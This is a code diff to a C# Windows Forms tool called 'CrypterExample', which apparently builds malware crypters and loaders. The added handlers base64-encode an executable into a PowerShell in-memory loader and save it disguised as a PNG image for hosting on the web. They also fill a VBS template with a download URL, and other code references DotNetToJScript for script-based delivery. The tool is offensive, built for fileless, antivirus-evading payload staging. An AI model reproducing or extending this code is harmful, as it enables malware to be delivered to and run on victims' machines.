@@ -35,7 +35,7 @@ namespace CrypterExample
 
         private void button4_Click(object sender, EventArgs e)
         {
-            string Source = Crypter.Properties.Resources.base64;
+            string Source = Resources.base64;
             if (textBox1.Text != "")
             {
                 byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
@@ -503,6 +503,50 @@ namespace CrypterExample
 					MessageBox.Show("Please enter the url of the js by using DotNetToJScript.",
 						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
 				}				
+			}
+			else
+			{
+				MessageBox.Show("Please enter the url.",
+						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+		}
+
+		private void button17_Click(object sender, EventArgs e)
+		{
+			if (textBox1.Text != "")
+			{
+				byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
+				string EncryptedStr = Convert.ToBase64String(FileBytes);
+				string Source = "[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String('" + EncryptedStr + "')).'EntryPoint'.'Invoke'($null,$null)";
+				SaveFileDialog s = new SaveFileDialog();
+				s.DefaultExt = "bmp";
+				s.Filter = "PNG Files|*.png";
+				if (s.ShowDialog() == DialogResult.OK)
+				{
+					StreamWriter sw = File.AppendText(s.FileName); //保存到指定路径
+					sw.Write(Source);
+					sw.Flush();
+					sw.Close();
+					MessageBox.Show("Upload to web,and copy the link to url.",
+						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+				}
+			}
+			else
+			{
+				MessageBox.Show("Please select the file.",
+						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+		}
+
+		private void button18_Click(object sender, EventArgs e)
+		{
+			string Source = Resources.VBS_img;
+			if (textBox4.Text != "")
+			{
+				Source = Source.Replace("123456", textBox4.Text);
+				textBox2.Text = Source;
+				MessageBox.Show("Copy to txt file and rename to VBS file.",
+						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
 			}
 			else
 			{
